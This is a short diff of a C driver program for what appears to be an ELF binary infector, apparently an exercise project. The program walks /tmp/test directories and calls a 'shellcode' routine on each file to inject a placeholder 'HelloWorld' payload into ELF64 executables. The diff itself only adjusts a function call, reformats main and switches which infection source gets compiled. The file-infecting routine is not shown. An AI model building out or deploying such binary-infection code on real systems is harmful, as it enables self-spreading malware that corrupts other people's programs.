@@ -5,12 +5,13 @@
 const char *payload = "HelloWorld";
 
 static int  infectFile(const char *dirname, struct dirent *file, shellcode fun) {
+  (void)dirname;
   int   ret;
   void  *handle;
 
   if ((handle = dlopen(NULL, RTLD_NOW)) == NULL)
     return (-1);
-  if ((ret = fun(dlsym, handle, dirname, file->d_name, payload)) == -1)
+  if ((ret = fun()) == -1)
     return (-1);
   else if (ret == 1)
     dprintf(1, "Error: \"%s\" is not an Elf64 file\n", file->d_name);
@@ -34,14 +35,13 @@ static int  infectBins(const char *dirname, shellcode fun) {
   return (0);
 }
 
-int   main(void) {
-  size_t  i;
+int   main(void) { size_t  i;
   char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
   shellcode code;
   shellcode fun;
 
   #ifdef DEBUG
-    system("gcc -I ./includes/ -c srcs/infection.c -o infection.o");
+    system("gcc -I ./includes/ -c srcs/infection2.c -o infection.o");
     int           fd;
     struct stat   stats;
     if ((fd = open("./infection.o", O_RDONLY)) == -1)
